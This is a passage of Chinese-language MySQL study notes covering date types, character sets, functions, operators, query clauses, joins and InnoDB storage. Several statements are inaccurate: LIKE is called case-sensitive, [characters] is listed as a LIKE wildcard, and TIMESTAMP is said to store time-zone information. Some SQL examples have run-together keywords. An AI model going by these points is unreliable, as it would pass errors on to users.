HH:MM:SS）。然而，这两种数据类型在处理时区信息的方式上存在根本差异：\n\nTIMESTAMP：\nTIMESTAMP数据类型存储带有时区信息的日期和时间值。\n\n当在TIMESTAMP列中插入一个值时，MySQL会将给定的日期和时间转换为UTC（协调世界时）并存储它。\n当从TIMESTAMP列检索数据时，MySQL会将存储的UTC时间转换回会话时区（或为服务器设置的时区），因此可能会看到根据当前时区调整的值。\n\n\nDATETIME：DATETIME数据类型不包括时区信息。\n\n当在DATETIME列中插入一个值时，MySQL会存储提供的确切日期和时间，而不会进行任何时区转换。\n当从DATETIME列检索数据时，数据保持不变，并且不会进行时区转换。原始值在存储时返回。\n\n\n\n字符集和比较规则MySQL的字符集和比较规则有四个级别，分别是服务器级别、数据库（schema）级别、表（table）级别、列级别。\n查看字符集的语法：\nSHOW (CHARACTER SET|CHARSET) [LIKE 匹配的模式];\n\n查看比较规则的语法：\nSHOW COLLATION [LIKE 匹配的模式];\n\n比较规则名称后缀，及其英文释义和描述：\n\n\n\n后缀\n英文释义\n描述\n\n\n\n_cs\ncase sensitive\n区分大小写\n\n\n_ci\ncase insensitive\n不区分大小写\n\n\n_as\naccent sensitive\n区分重音\n\n\n_ai\naccent insensitive\n不区分重音\n\n\n_bin\nbinary\n以二进制方式比较\n\n\n从客户端发送请求给服务器到服务器接收请求并返回结果的过程中发生的字符转换包括：\n\n客户端发送的请求字节序列是采用哪种字符集进行编码。\n与启动选项default-character-set有关。\n\n服务器收到客户端的请求后认为客户端是采用哪种字符集进行编码的。\n与系统变量character-set-client有关。\n\n服务器在运行过程中会把请求的字节序列转化为以哪种字符集编码的字节序列。\n与系统变量character-set-connection有关。\n\n服务器向客户端返回字节序列时会采用哪种字符集进行编码。\n与系统变量character-set-result有关。\n\n客户端在收到字节序列的响应后的怎样将字节序列写到控制台中。\n与启动选项default-character-set有关。\n\n\n函数聚合函数（部分）\nSUM：计算某个字段的总和。\nSELECT SUM(column_name) FROM table_name;\n\nCOUNT：返回某个字段的行数，可以用于计算某个列或整个表中行的数量。\nSELECT COUNT(column_name) FROM table_name;\n\nAVG：计算某个字段的平均值。\nSELECT AVG(column_name) FROM table_name;\n\nMIN：找出某个字段的最小值。\nSELECT MIN(column_name) FROM table_name;\n\nMAX：找出某个字段的最大值。\nSELECT MAX(column_name) FROM table_name;\n\nGROUP_CONCAT：将某个字段的值连接成一个字符串。可以指定SEPARATOR来指定连接字符串的分隔符，如果没有指定，默认使用逗号作为分隔符。\nSELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) FROM table_name;\n\n字符串操作函数（部分）\nCONCAT()：用于连接字符串。\n语法：CONCAT(*str1*,*str2*,...)，str是要拼接的字符串。\n例如，下面的语句会查询users表中的first_name和last_name字段，并将这两个字段的值用空格连接起来，作为新的列full_name的值进行返回。\nSELECT CONCAT(first_name, &#x27; &#x27;, last_name) AS full_name FROM users;\n\nRIGHT()：返回字符串的右侧指定长度的子字符串。\n语法：RIGHT(*str*,*len*)，str是要截取的字符串，len是需要返回的字符长度。\n例如，下面的语句会查询users表中的username字段，并返回该字段后两个字符组成的新的字符串：\nSELECT RIGHT(username, 2) AS last_two_chars FROM users;\n\nSUBSTRING()：从字符串中截取指定位置和长度的子字符串。\n语法：SUBSTRING(*str*,*pos*,*len*)，str是要截取的字符串，pos是开始的位置（从1开始计数，pos值为0将返回空字符串），len是需要返回的字符长度。\n例如，下面的语句会查询users表中的phone_number字段，并返回该字段第4个字符开始的3个字符组成的新的字符串：\nSELECT SUBSTRING(phone_number, 4, 3) AS area_code FROM users;\n\nREPEAT()：返回一个重复指定次数的字符串。\n语法：REPEAT(*str*,*count*)，str是需要重复的字符串，count是需要重复的次数。\n例如，下面的语句会返回一个由5个“-”字符组成的新的字符串：\nSELECT REPEAT(&#x27;-&#x27;, 5) AS line FROM users;\n\nREVERSE()：返回一个字符串的反转字符串。\n语法：REVERSE(*str*)，str是要翻转的字符串。\n例如，下面的语句会查询users表中的username字段，并返回username字段的字符顺序全部颠倒后的字符串：\nSELECT REVERSE(username) AS reversed_name FROM users;\n\n日期和时间函数（部分）MySQL提供了很多日期和时间函数，可以方便地对日期和时间进行处理和计算。以下是一些常用的MySQL日期和时间函数：\n\nNOW()：返回当前日期和时间。\n例如，下面的语句会查询当前日期和时间：\nSELECT NOW();\n\nDATE()：从一个日期或日期时间表达式中提取日期部分。\n例如，下面的语句会返回当前日期：\nSELECT DATE(NOW());\n\nDATE_FORMAT()：将给定日期格式化成指定的字符串形式。\n语法是DATE_FORMAT(date, format) ，其中 date 为待格式化的日期，format 为日期格式串（如 ‘%Y-%m-%d’ 表示以年、月、日的格式显示日期）。\n例如，以下查询语句将会格式化出当前日期并输出：\nSELECT DATE_FORMAT(CURDATE(), &#x27;%Y-%m-%d&#x27;);\n\nDATE_SUB()：对日期执行减法操作。\n可以使用 DATE_SUB() 函数和 INTERVAL 子句来查询一个日期字段 c 为五年前的记录。具体语法如下：\nSELECT * FROM tableWHERE c = DATE_SUB(NOW(), INTERVAL 5 YEAR);\n\n这个查询语句中，NOW() 函数返回当前时间，DATE_SUB() 函数将当前时间减去 5 年，然后查询满足条件的所有记录。\n\nDATE_ADD()：对给定日期增加或减去一定的时长。\n语法是DATE_ADD(date, INTERVAL value unit) ，其中 date 为基准日期，value 为增加或减少的数值，unit 为时间单位（如 DAY、WEEK、MONTH、YEAR 等）。\n例如，以下查询语句将会计算出五年前的日期：\nSELECT DATE_ADD(CURDATE(), INTERVAL -5 YEAR);\n\nCURDATE()：返回系统当前日期。\n例如，以下查询语句将会返回当前日期：\nSELECT CURDATE();\n\nDATEDIFF()：返回两个日期之间的天数差值\n例如，以下查询语句将会计算出今天与指定日期之间的天数差值：\nSELECT DATEDIFF(CURDATE(), &#x27;2022-01-01&#x27;);\n\nTIME()：从一个日期或日期时间表达式中提取时间部分\n例如，下面的语句会返回当前时间：\nSELECT TIME(NOW());\n\nYEAR()：从一个日期或日期时间表达式中提取年份部分\n例如，下面的语句会返回当前年份：\nSELECT YEAR(NOW());\n\nMONTH()：从一个日期或日期时间表达式中提取月份部分。\n例如，下面的语句会返回当前月份：\nSELECT MONTH(NOW());\n\nDAY()：从一个日期或日期时间表达式中提取日份部分。\n例如，下面的语句会返回当前日期中的天数：\nSELECT DAY(NOW());\n\nHOUR()：从一个日期或日期时间表达式中提取小时部分。\n例如，下面的语句会返回当前时间中的小时数：\nSELECT HOUR(NOW());\n\nMINUTE()：从一个日期或日期时间表达式中提取分钟部分。\n例如，下面的语句会返回当前时间中的分钟数：\nSELECT MINUTE(NOW());\n\nSECOND()：从一个日期或日期时间表达式中提取秒部分。\n例如，下面的语句会返回当前时间中的秒数：\nSELECT SECOND(NOW());\n\n运算符比较函数和运算符\n\n\nName\nDescription\n\n\n\n&gt;\nGreater than operator\n\n\n&gt;=\nGreater than or equal operator\n\n\n&lt;\nLess than operator\n\n\n&lt;&gt;, !=\nNot equal operator\n\n\n&lt;=\nLess than or equal operator\n\n\n&lt;=&gt;\nNULL-safe equal to operator\n\n\n=\nEqual operator\n\n\nBETWEEN ... AND ...\nWhether a value is within a range of values\n\n\nCOALESCE()\nReturn the first non-NULL argument\n\n\nGREATEST()\nReturn the largest argument\n\n\nIN()\nWhether a value is within a set of values\n\n\nINTERVAL()\nReturn the index of the argument that is less than the first argument\n\n\nIS\nTest a value against a boolean\n\n\nIS NOT\nTest a value against a boolean\n\n\nIS NOT NULL\nNOT NULL value test\n\n\nIS NULL\nNULL value test\n\n\nISNULL()\nTest whether the argument is NULL\n\n\nLEAST()\nReturn the smallest argument\n\n\nLIKE\nSimple pattern matching\n\n\nNOT BETWEEN ... AND ...\nWhether a value is not within a range of values\n\n\nNOT IN()\nWhether a value is not within a set of values\n\n\nNOT LIKE\nNegation of simple pattern matching\n\n\nSTRCMP()\nCompare two strings\n\n\nBETWEEN详解在MySQL中，BETWEEN是一个比较运算符，用于检查一个值是否在指定的一组或区间内，返回值是布尔类型。它能够用于数字，日期和时间等数据类型。\n需要注意的是，在使用BETWEEN时，应该确保low和high的顺序正确，即low应该小于等于high。否则会导致结果不准确。同时也需要注意数据类型的匹配问题，避免类型不匹配的情况。\nBETWEEN语法如下：\nvalue BETWEEN low AND high;\n\n其中，value是需要进行比较的值，low和high是指定的区间范围。\n对于日期和时间类型的值来说，BETWEEN则会将这个值转换为一个日期&#x2F;时间对象后再进行比较。\n例如，假设我们有一个名为orders的表格，其中包含了订单的信息，包括订单编号、下单日期和订单总额等。如果我们想要查询某一段时间内的订单，可以使用BETWEEN关键字来实现，如下所示：\nSELECT * FROM orders WHERE order_date BETWEEN &#x27;2021-01-01&#x27; AND &#x27;2021-03-31&#x27;;\n\n这条语句查询了从2021年1月1日到2021年3月31日之间的订单信息。\nIN详解在MySQL中，IN是一个比较运算符，用于检查某个值是否包含在一个值集合内。\n“&#x3D;”不能代替IN，因为“&#x3D;”在返回结果多于一条的时候会报错，“Subquery returns more than 1 row”。\n IN 不能对 NULL 进行匹配，不会返回NULL值匹配的字段。\nNOT IN语句后面的范围不能出现NULL，否则执行无效，不会返回任何字段。\n以下是其基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name IN (value1, value2, ...);\n\n在这个语句中，column1, column2, … 是想从表中选择的列的名称，table_name是想从中选择数据的表的名称，column_name是想要应用条件的列的名称，value1, value2, … 是想在列中查找的值。\n例如，如果想从students表中选择名字为’John Doe’或’Jane Doe’的学生，可以这样做：\nSELECT * FROM students WHERE name IN (&#x27;John Doe&#x27;, &#x27;Jane Doe&#x27;);\n\nIN运算符不完全等价于多个OR条件。虽然上面的查询等价于以下查询：\nSELECT * FROM students WHERE name = &#x27;John Doe&#x27; OR name = &#x27;Jane Doe&#x27;;\n\n但是，因为 IN 不能对 NULL 进行处理，\n所以\nSELECT column1FROM table_nameWHERE column1 IN (1, 2, NULL);\n\n和\nSELECT column1FROM table_nameWHERE column1 IN (1, 2) OR column1 IS NULL;\n\n的处理逻辑是不一样的，对于前一个使用IN的SQL语句来说，只会返回column1为1、2的列值，不会对null值进行匹配，即查询不到NULL值记录。而对于后一个使用OR的SQL语句来说，能够返回column1为1、2或NULL的列值，即能够处理NULL。\n还可以在IN子句中使用子查询来动态生成值的列表。例如，以下查询会选择所有在courses表中有记录的学生：\nSELECT * FROM students WHERE id IN (SELECT student_id FROM courses);\n\n在这个例子中，子查询SELECT student_id FROM courses会返回所有在courses表中有记录的学生的ID，然后主查询会从students表中选择这些ID对应的学生。\nLIKE详解在MySQL中，LIKE是一个用于模式匹配的操作符，通常用于WHERE子句中以过滤符合特定模式的数据。\nLIKE匹配区分大小写，如果需要不区分大小写的匹配，可以使用COLLATE关键字指定不区分大小写的匹配规则，如 WHERE column_name COLLATE utf8_general_ci LIKE pattern。\n以下是LIKE的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name LIKE pattern;\n\n在这里，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，column_name 是想要应用模式匹配的列的名称，pattern 是匹配模式。\nLIKE操作符使用通配符来匹配模式，常用的通配符有：\n\n%：匹配任意字符（包括零个字符）。\n_：匹配任意单个字符。\n[characters]：匹配指定字符集中的任意单个字符。\n[^characters]：匹配不在指定字符集中的任意单个字符。\n\n以下是一些使用LIKE的例子：\n\n以特定字符开头的匹配：\nSELECT * FROM students WHERE name LIKE &#x27;J%&#x27;;\n\n这个查询将返回名字以字母 ‘J’ 开头的所有学生记录。\n\n以特定字符结尾的匹配：\nSELECT * FROM students WHERE email LIKE &#x27;%example.com&#x27;;\n\n这个查询将返回邮箱以 ‘@example.com’ 结尾的所有学生记录。\n\n包含特定字符的匹配：\nSELECT * FROM students WHERE name LIKE &#x27;%Doe%&#x27;;\n\n这个查询将返回名字中包含 ‘Doe’ 的所有学生记录。\n\n指定单个字符的匹配：\nSELECT * FROM students WHERE name LIKE &#x27;_ohn&#x27;;\n\n这个查询将返回名字为四个字符并以 ‘ohn’ 结尾的所有学生记录，其中第二个字符可以是任意字符。\n\n\n逻辑运算符\n\n\nName\nDescription\n\n\n\nAND, &amp;&amp;\nLogical AND\n\n\nNOT, !\nNegates value\n\n\n[OR, &#96;\n\n\n\nXOR\nLogical XOR\n\n\n关键字（部分）WHERE在MySQL中，WHERE子句用于在查询中指定条件，以过滤出满足特定条件的记录。以下是WHERE子句的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE condition;\n\n在这里，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，condition 是用于确定哪些记录应该被返回的条件。\n以下是一些使用WHERE子句的例子：\n\n基于单个条件的查询：\n SELECT * FROM students WHERE age &gt; 20;\n\n 这个查询将返回年龄大于 20 的所有学生记录。\n\n基于多个条件的查询：\n SELECT * FROM students WHERE age &gt; 20 AND gender = &#x27;Female&#x27;;\n\n 这个查询将返回年龄大于 20 并且性别为女性的学生记录。\n\n使用比较运算符的查询：\n SELECT * FROM students WHERE age BETWEEN 18 AND 25;\n\n 这个查询将返回年龄在 18 到 25 之间的学生记录。\n\n使用逻辑运算符的查询：\n SELECT * FROM students WHERE age &gt; 20 OR gender = &#x27;Female&#x27;;\n\n 这个查询将返回年龄大于 20 或性别为女性的学生记录。\n\n\n请注意，WHERE子句可以使用比较运算符（如 =, &lt;&gt;, &lt;, &gt;, &lt;=, &gt;=），逻辑运算符（如 AND, OR, NOT），以及其他条件表达式（如 IN, LIKE, IS NULL 等）来构建复杂的条件。\nWHERE可以对GROUP BY分组前的记录进行过滤，聚合函数不能放在WHERE子句中，即在如下语句中，WHERE在GROUP BY之前执行：\nSELECT\tempid, AVG(sales)FROM\tWHERE sales &gt;= 50GROUP BY empid;\n\nGROUP BY在MySQL中，GROUP BY子句用于将查询结果按照一个或多个列进行分组。它常与聚合函数（如SUM、COUNT、AVG等）一起使用，以对每个组应用聚合函数并生成汇总结果。\n以下是GROUP BY的基本语法：\nSELECT column1, column2, ..., aggregate_function(column)FROM table_nameGROUP BY column1, column2, ...;\n\n在这里，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，aggregate_function 是一个聚合函数（如 SUM, COUNT, AVG 等），column 是想要按照其进行分组的列。\n以下是一个例子：\nSELECT department, gender, COUNT(*) as total_studentsFROM studentsGROUP BY department, gender;\n\n这个查询将根据department和gender两个列对记录进行分组，并计算每个部门、性别组合的学生人数。\nHAVING在MySQL中，HAVING子句用于在GROUP BY子句后对分组结果进行筛选，而且可以对聚合函数进行过滤。\nHAVING子句只能和GROUP BY子句搭配使用，在执行GROUP BY子句之后，可以使用HAVING子句来进一步筛选符合条件的结果集。\n以下是HAVING的基本语法：\nSELECT column1, column2, ..., aggregate_function(column)FROM table_nameGROUP BY column1, column2, ...HAVING condition;\n\n在这里，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，aggregate_function 是一个聚合函数（如 SUM, COUNT, AVG 等），column 是想要按照其进行分组的列，condition 是用于筛选结果的条件。\n以下是一个例子：\nSELECT department, COUNT(*) as total_studentsFROM students\tGROUP BY departmentHAVING COUNT(*) &gt; 10;\n\n这个查询将根据学生表中的department列对记录进行分组，并计算每个部门的学生人数。然后，HAVING子句筛选出具有超过 10 名学生的部门。 \nEXISTS在MySQL中，EXISTS用于检查一个子查询是否返回了任何行。EXISTS运算符返回布尔值（TRUE或FALSE），如果子查询返回至少一行，则为TRUE，否则为FALSE。它通常用于WHERE子句中作为一个条件来过滤查询结果。\n以下是EXISTS的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE EXISTS (subquery);\n\n在这里，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，subquery 是一个子查询，它可以是一个完整的SELECT语句。\n以下是一个例子：\nSELECT nameFROM studentsWHERE EXISTS (    SELECT *    FROM courses    WHERE courses.student_id = students.id);\n\n这个查询将返回在students表中存在对应课程的学生的姓名。子查询检查是否存在与students表中的学生关联的记录在courses表中。\nIN和EXISTS的区别IN和EXISTS的区别：**如果子查询得出的结果集记录较少，主查询中的表较大且又有索引时应该用IN，反之如果外层的主查询记录较少，子查询中的表大且又有索引时使用EXISTS**。IN和EXISTS主要是造成了驱动顺序的改变 （这是性能变化的关键），如果是 EXISTS，那么以外层表为驱动表，先执行主查询，如果是IN，那么子查询的表是驱动表，先执行子查询。\nDISTINCTMySQL中的DISTINCT关键字适用于单个列的去重，若需要多列的去重，则需要使用GROUP BY语句来实现。\n例如，当我们需要查询某张表中的所有员工身份证号码时，可能会出现一些员工重复的情况。此时可以使用DISTINCT关键字来消除重复项，确保查询结果唯一：\nSELECT DISTINCT id_number FROM employee;\n\n上述语句将返回一张包含所有不重复身份证号码的数据表。\nORDER BY和ACS或DESC在MySQL中，ORDER BY子句可以指定查询结果按照一个或多个列进行升序（默认）或降序排序。\n以下是ORDER BY子句的基本语法：\nSELECT column1, column2, ...FROM table_nameORDER BY column1 [ASC|DESC], column2 [ASC|DESC], ...;\n\n在这里，column1, column2, … 是想要排序的列的名称，ASC表示升序（默认），DESC表示降序。\n以下是一些例子：\n\n按照单个列进行升序排序：\n SELECT * FROM studentsORDER BY name ASC;\n\n 这将按照name列的字母顺序对students表中的记录进行升序排序。\n\n按照单个列进行降序排序：\n SELECT * FROM studentsORDER BY age DESC;\n\n 这将按照age列的逆序（从高到低）对students表中的记录进行降序排序。\n\n按照多个列进行排序：\n SELECT * FROM studentsORDER BY age ASC, name ASC;\n\n 这将首先按照age列进行升序排序，然后对于具有相同age值的记录，按照name列的字母顺序进行升序排序。\n\n\nLIMIT和OFFSET在MySQL中，LIMIT用于限制查询结果的数量。它可以在SELECT语句中用于指定返回的行数。OFFSET 用于从查询结果的某个特定行开始返回数据，必须和 LIMIT 一起使用。\n以下是LIMIT的基本语法：\nSELECT column1, column2, ...FROM table_nameLIMIT count;\n\n或\nSELECT column1, column2, ...FROM tableWHERE conditionORDER BY column1, column2, ...LIMIT offset, count;\n\nOFFSET 的语法如下：\nSELECT column1, column2, ...FROM tableWHERE conditionORDER BY column1, column2, ...LIMIT count OFFSET offset;\n\n其中，column1, column2, … 是想要从表中选择的列的名称，table_name 是想要查询的表的名称，offset 是要偏移的行数，count 是要返回的行数。\n以下是一些使用LIMIT和OFFSET的例子：\n\n限制结果集的行数：\n SELECT * FROM students LIMIT 10;\n\n 这个查询将返回 students 表中的前 10 行记录。\n\n指定起始位置和行数：\n SELECT * FROM students LIMIT 5, 10;\n\n 或使用OFFSET写为：\n SELECT *FROM mytableORDER BY idLIMIT 10 OFFSET 5;\n\n 这个查询将从 students 表中的第 6 行开始（偏移量为 5），返回后续的 10 行记录。这是通过使用两个参数来实现的，第一个参数是起始位置的偏移量，第二个参数是要返回的行数。\n\n与ORDER BY子句一起使用：\n SELECT * FROM students ORDER BY age DESC LIMIT 5;\n\n 这个查询将按照年龄降序排序，并返回年龄最大的前 5 条学生记录。\n\n\nCASE WHENMySQL 的 CASE WHEN 是一种条件表达式，它类似于其他编程语言中的 switch 或 if-then-else 结构。它可以在 SELECT 语句中使用，根据一个或多个条件返回不同的值。\nCASE WHEN 语法的基本结构如下：\nCASE expressionWHEN value_1 THEN result_1WHEN value_2 THEN result_2...ELSE default_resultEND\n\nCASE 关键字后面的 expression 是要检查的值或表达式，value_x 是与 expression 进行比较的值，而 result_x 则是与 value_x 对应的结果。如果 expression 和某个 value_x 相匹配，则会返回对应的 result_x。如果都没有匹配，将会执行 ELSE 子句中指定的 default_result（可选的，如果没有 ELSE 子句，将返回 NULL）。\n以下是一个简单的例子，演示了如何在 SELECT 语句中使用 CASE WHEN：\nSELECT employee_name, CASE department_id\tWHEN 1 THEN &#x27;Sales&#x27;    WHEN 2 THEN &#x27;Marketing&#x27;    ELSE &#x27;Other&#x27;END as departmentFROM employees;\n\n这条语句查询了一个名为 employees 的表格，其中包含员工信息，包括姓名、部门编号等。它使用 CASE WHEN 结构来把部门编号转换为对应的文本描述，最终会返回每个员工的名称和所在部门的文本标签。\n需要注意的是，CASE WHEN 也支持复杂的判断逻辑和多个条件，可以使用嵌套和逻辑运算符来实现复杂的条件判断。\n以下是CASE WHEN的另一个例子：\nSELECT id,CASE\tWHEN sales &gt;= 100 THEN &#x27;高&#x27;\tWHEN sales &gt;= 50 THEN &#x27;中等&#x27;    ELSE &#x27;低&#x27;END AS &#x27;评价&#x27;FROM tb;\n\nIF-THEN-ELSE在MySQL中，支持IF-THEN-ELSE条件语句。基本语法如下所示：\nIF condition THEN    statement(s);ELSE    statement(s);END IF;\n\n其中，如果“condition”（条件）为真，则执行THEN子句中的一个或多个语句，否则执行ELSE子句中的一个或多个语句。ELSE&#96;块是可选的。\n让我们看一个实际的例子：\nSET @score = 80;IF @score &gt;= 60 THEN    SELECT &#x27;Pass&#x27;;ELSE    SELECT &#x27;Fail&#x27;;END IF;\n\n在上述示例中，将变量@score设置为80分。然后，使用IF语句检查是否及格（分数大于等于60）。如果成立，则输出“Pass”，否则输出“Fail”。\n表查询子查询通俗的讲，在SELECT的记录中SELECT就是子查询。子查询是在查询中使用一个查询作为另一个查询的子集。使用子查询可以轻松地扩展查询功能并实现更复杂的条件过滤机制。\n下面是一个示例，该示例演示如何使用子查询：\n假设有两个表：Orders和Customers，分别存储订单和客户的信息。现在，假设想要查询所有来自某些城市的顾客的订单详细信息。可以使用以下查询：\nSELECT *FROM OrdersWHERE customer_id IN (  SELECT customer_id  FROM Customers  WHERE city = &#x27;New York&#x27;);\n\n这个查询中，内部SELECT语句是一个子查询，它返回所有位于“New York”城市的客户ID。外部SELECT语句使用WHERE子句来过滤Orders表中包含在子查询结果集中的customer_id值的行，并将行返回到结果集中。\n下面是另一个示例：\n提取大于等于平均值的记录\nSELECT *FROM tb1WHERE age &gt;= (\tSELECT AVG(age) FROM tb1)\n\n下面是使用IN的子查询的语法：\nSELECT column_name1, column_name2... FROM table_nameWHERE column_name IN (通过子查询SELECT语句提取的列)\n\n示例：\nSELECT empid, name\tFROM tb1WHERE empid \tIN (SELECT empid FROM tb2);\n\n下面是使用EXISTS的子查询的语法：\nSELECT column_name1, column_name2... FROM table_nameWHERE EXISTS (通过子查询SELECT语句提取的列);\n\n示例：\nSELECT *\tFROM tb1WHERE EXISTS\t(SELECT * FROM tb2 WHERE tb1.empid=tb2.empid);\n\n联合查询（UNION）在 MySQL 中，UNION 关键字用于将两个或多个 SELECT 语句的结果集合并成一个结果集。\n需要注意的是，在使用 UNION 或 UNION ALL 进行结果集合并时，被合并的列的类型必须相似或可隐式转换。\n UNION 和 UNION ALL 的语法格式：\nSELECT expression1, expression2, ... expression_nFROM tables[WHERE conditions]UNION [ALL | DISTINCT]SELECT expression1, expression2, ... expression_nFROM tables[WHERE conditions];\n\n\nALL：可选，返回所有结果集，UNION 可以去重，而 UNION ALL 则包含重复数据。\nDISTINCT：可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。\n\n连接查询自连接（Self JOIN）在MySQL中，自连接是将表与其自身同名的表进行连接。使用自连接时需要使用别名（alias）来区分每个表实例。\n以下是一个示例：\nSELECT a.employee_name, b.employee_nameFROM employee a, employee bWHERE a.manager_id = b.employee_id;\n\n在上面的例子中，我们查询了“employee”表中所有员工的名称和他们各自的经理的名称。为此，我们需要对“employee”表进行自连接，以将每个员工与其经理联系起来。这里我们使用a和b两个别名来表示同一个表中的两个不同实例。在上面的例子中，我们在WHERE子句中指定连接条件“a.manager_id &#x3D; b.employee_id”，这意味着我们正在连接的是一个员工和他的经理。\n内连接（INNER JOIN）INNER JOIN操作用于连接两个表并返回匹配的行，只有当在关联列中两个表都存在匹配时才会返回记录。\n除此之外，还有一种相似的语法格式叫做“JOIN…ON…”，其效果与INNER JOIN完全相同。\n语法格式：\nSELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：\nSELECT orders.id, orders.order_date, products.product_nameFROM ordersINNER JOIN productsON orders.product_id = products.id;\n\n在上面的例子中，我们连接了“商品”表和“订单”表，并使用ON子句指定了连接条件（“product_id”），结果集包括了这两个表中符合连接条件的数据。\n左外连接（LEFT JOIN）LEFT JOIN操作连接左侧的表和右侧的表，并返回左侧表的所有记录以及满足连接条件的右侧表的记录，如果没有匹配的行，则该结果集中的右侧表的字段将被设置为NULL值。LEFT JOIN也可以写成LEFT OUTER JOIN。\n语法格式：\nSELECT column_name(s) FROM table1 LEFT [OUTER] JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsLEFT JOIN employeesON departments.department_id = employees.department_id;\n\n在上面的例子中，我们连接了“部门”和“员工”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的部门和符合连接条件的员工信息，即使某些部门没有员工也会显示出来。\n右外连接（RIGHT JOIN）RIGHT JOIN操作连接右侧的表和左侧的表，并返回右侧表的所有记录以及满足连接条件的左侧表的记录。如果没有匹配的行，则该结果集中的左侧字段将被设置为NULL值。RIGHT JOIN也可以写成RIGHT OUTER JOIN。LEFT JOIN和RIGHT JOIN可以用于处理一对多、多对一的关系查询。\n语法格式：\nSELECT column_name(s) FROM table1 RIGHT [OUTER] JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：\nSELECT employees.first_name, employees.last_name, departments.department_nameFROM employeesRIGHT JOIN departmentsON employees.department_id = departments.department_id;\n\n在上面的例子中，我们连接了“员工”和“部门”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的员工信息和与之相关的部门信息，即使某些员工没有分配到部门也会显示出来。\nON和USINGMySQL ON是一种在两个表之间进行连接的常用方法，通过指定连接条件来连接两个表并返回符合条件的结果。与WHERE最大的区别是不符合WHERE子句的的记录不论是来自驱动表还是被驱动表，如果不匹配都不会加入结果集；而ON子句中驱动表的记录即使在被驱动表中找不到匹配的记录，也依然会被加入到结果集中。\n语法格式：\nSELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name1 = table2.column_name2;\n\n其中，table1和table2是要连接的表，column_name1和column_name2是两个表的列名。\n使用示例：\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsJOIN employees ON departments.department_id = employees.department_id;\n\n需要注意的是，在使用ON子句时，可以比较不同类型的数据，如数字、文本等。在连接多个表时，也可以在ON子句中使用逻辑运算符（例如AND和OR），以指定更复杂的连接条件。\nUSING操作表示将在两个表之间使用共同的列进行连接。这样可以避免在ON子句的连接条件中重复指定相同列名，从而使查询更加简洁。\n需要注意的是，USING只能用于比较两个表中具有相同名称的列。如果两个表的连接条件的列名称不同，则必须使用ON子句来指定要连接的列\n语法格式：\nSELECT column_name(s) FROM table1 JOIN table2 USING (column_name);\n\n其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。\n使用示例：\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsJOIN employees USING (department_id);\n\n使用departments表和employees表中相同的列department_id进行表连接，返回满足departments.department_id&#x3D;employees.department_id条件的字段的列。\n存储引擎MySQL的存储引擎输出MySQL支持的存储引擎：\n\n其中，Support列表示该存储引擎是否可用；Transactions列表示该存储是否支持事务，XA（eXtended Architecture）列代表该存储引擎是否支持分布式事务，SavePoints列代表该存储引擎是否支持事务的部分回滚。\n\nInnoDB：支持事务、分布式事务、行级锁、外键，其它存储引擎都不支持。\nMYISAM：支持表级锁。\nMEMORY：使用内存存储数据而不是磁盘。\n\n设置存储引擎存储引擎负责对表中的数据进行读取和写入、以及将数据存储到物理存储器上等功能。可以为不同的表设置不同的存储引擎，即不同的表可以有不同的物理存储结构、不同的读取和写入的方式。\n设置表的存储引擎的方法：\n\n创建表时指定存储引擎\n语法示例：\nCREATE TABLE 表名 &#123;\t建表语句;&#125; ENGINE = 存储引擎的名称;\n\n修改表的存储引擎\n如果需要修改已有表的存储引擎，可以使用ALTER TABLE语句来实现.\n语法：\nALTER TABLE 表名 ENGINE = 存储引擎的名称;\n\n示例：\nALTER TABLE table_name ENGINE=MyISAM;\n\n使用上述语句将会将名为table_name的表的存储引擎修改为MyISAM。\n\n\n显示存储引擎可以通过显示表的创建信息命令来查看使用的存储引擎\nSHOW CREATE TABLE employee; \n\n输出结果示例如下：\nCREATE TABLE `employee` (  `id` int NOT NULL,  `emp_id` char(10) DEFAULT NULL,  `emp_name` varchar(10) DEFAULT NULL,  `manager_id` char(10) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\n\nInnoDB查询过程MySQL数据查询的主要过程：\n\n查询缓存\nMySQL会缓存查询结果，如果在缓存期间发生了数据更改，则缓存失效，会被删除。如果数据没有更改，则对于完全一致且不存在某些会改变查询含义的函数如NOW()，就会直接返回缓存中的内容。\n但是维护缓存是需要开销的，包括查询缓存、添加缓存、删除缓存、维护缓存内存区域。所以MySQL从5.7.20开始不推荐使用MySQL查询缓存功能，在MySQL8.0中直接将其删除了。\n\n语法解析\n判断语法是否正确。\n属于编译过程，涉及词法分析、语法分析、语义分析等。\n\n查询优化\n对语句进行优化，最终生成一个执行计划，可以使用EXPLAIN语句来查看某个语句的执行计划。\n\n存储引擎执行查询语句\n\n\n页结构InnoDB中页的大小一般是16KB，由启动选项（也是系统变量）innodb_page_size指定。InnoDB以页为基本单位进行磁盘和内存之间的数据交互，而不是以记录为单位。\n\n\n\n名称\n中文名\n占用空间大小\n简单描述\n\n\n\nFile Header\n文件头部\n38 字节\n页的一些通用信息\n\n\nPage Header\n页面头部\n56字节\n数据页专有的一些信息\n\n\nInfimum + Supremum\n页面中的最小记录和最大记录\n26字节\n两个虚拟的记录\n\n\nUser Records\n用户记录\n不确定\n用户存储的记录内容\n\n\nFree 